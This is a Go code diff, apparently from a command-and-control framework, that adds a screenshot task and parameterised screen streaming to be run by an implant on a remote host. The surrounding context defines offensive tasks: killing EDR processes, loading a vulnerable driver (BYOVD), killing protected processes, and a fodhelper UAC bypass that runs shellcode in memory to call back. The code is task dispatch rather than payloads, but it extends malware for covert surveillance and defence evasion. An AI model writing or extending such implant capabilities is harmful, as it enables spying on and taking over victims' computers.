@@ -26,8 +26,8 @@ type Manager struct {
 	// 会话热迁移（重连续传）：大文件直传断点状态。
 	// 挂在全局 Manager 上而非监听器实例：listener stop/start 会重建实例，
 	// 实例字段会在重启时丢失，导致断点续传失效（退化为全量重推）。
-	transferMu    sync.RWMutex
-	transfers     map[uint64]*TransferState
+	transferMu sync.RWMutex
+	transfers  map[uint64]*TransferState
 }
 
 // TransferState 记录一个进行中的大文件直传断点（服务端视角，taskID 关联）。
@@ -74,6 +74,9 @@ const (
 	// TaskTypeScreenStream 实时屏幕流（start/stop）。
 	TaskTypeScreenStream = "screen_stream"
 
+	// TaskTypeScreenshot 屏幕截图（支持 monitor/max_width/format/quality 参数）。
+	TaskTypeScreenshot = "screenshot"
+
 	// TaskTypeRelay 运行时中继控制（start 监听端口 / stop）。
 	TaskTypeRelay = "relay"
 
@@ -84,9 +87,9 @@ const (
 	TaskTypeEDRKill = "edr_kill"
 
 	// BYOVD / PPL
-	TaskTypeBYOVDLoad  = "byovd_load"
+	TaskTypeBYOVDLoad   = "byovd_load"
 	TaskTypeBYOVDUnload = "byovd_unload"
-	TaskTypePPLKill    = "ppl_kill"
+	TaskTypePPLKill     = "ppl_kill"
 
 	// TaskTypeUACBypass UAC 提权（fodhelper + 内存执行 shellcode 回连上线）。
 	TaskTypeUACBypass = "uac_bypass"
@@ -241,12 +244,38 @@ func (m *Manager) CreateBOFLoad(sessionID, data, args string) (*types.TaskInfo, 
 	})
 }
 
+// CreateScreenshot 创建截图任务。
+// params 为可选的截图参数（monitor / max_width / format / quality），
+// 植入端按参数裁剪显示器、缩放与编码；为空 = 整屏 + 默认编码（历史行为）。
+func (m *Manager) CreateScreenshot(sessionID string, params map[string]interface{}) (*types.TaskInfo, error) {
+	data := map[string]interface{}{}
+	for k, v := range params {
+		if v != nil {
+			data[k] = v
+		}
+	}
+	raw, _ := json.Marshal(data)
+	return m.Create(sessionID, TaskParams{
+		TaskType: TaskTypeScreenshot,
+		Data:     string(raw),
+	})
+}
+
 // CreateScreenStream 创建实时屏幕流任务（action = start / stop）。
-func (m *Manager) CreateScreenStream(sessionID, action string) (*types.TaskInfo, error) {
-	data, _ := json.Marshal(map[string]string{"action": action})
+// params 为可选的流参数（fps / quality / max_kbps / monitor / max_width / format），
+// 植入端按参数采集，并按带宽预算自适应画质；为空表示使用默认值。
+func (m *Manager) CreateScreenStream(sessionID, action string, params map[string]interface{}) (*types.TaskInfo, error) {
+	data := map[string]interface{}{"action": action}
+	for k, v := range params {
+		if v == nil {
+			continue
+		}
+		data[k] = v
+	}
+	raw, _ := json.Marshal(data)
 	return m.Create(sessionID, TaskParams{
 		TaskType: TaskTypeScreenStream,
-		Data:     string(data),
+		Data:     string(raw),
 	})
 }
 
@@ -270,7 +299,7 @@ func (m *Manager) CreateEDRKill(sessionID string, processes []string) (*types.Ta
 // CreateBYOVDLoad 创建 BYOVD 驱动加载任务。
 func (m *Manager) CreateBYOVDLoad(sessionID, driverB64, serviceName, deviceName string) (*types.TaskInfo, error) {
 	data, _ := json.Marshal(map[string]string{
-		"driver_b64":  driverB64,
+		"driver_b64":   driverB64,
 		"service_name": serviceName,
 		"device_name":  deviceName,
 	})
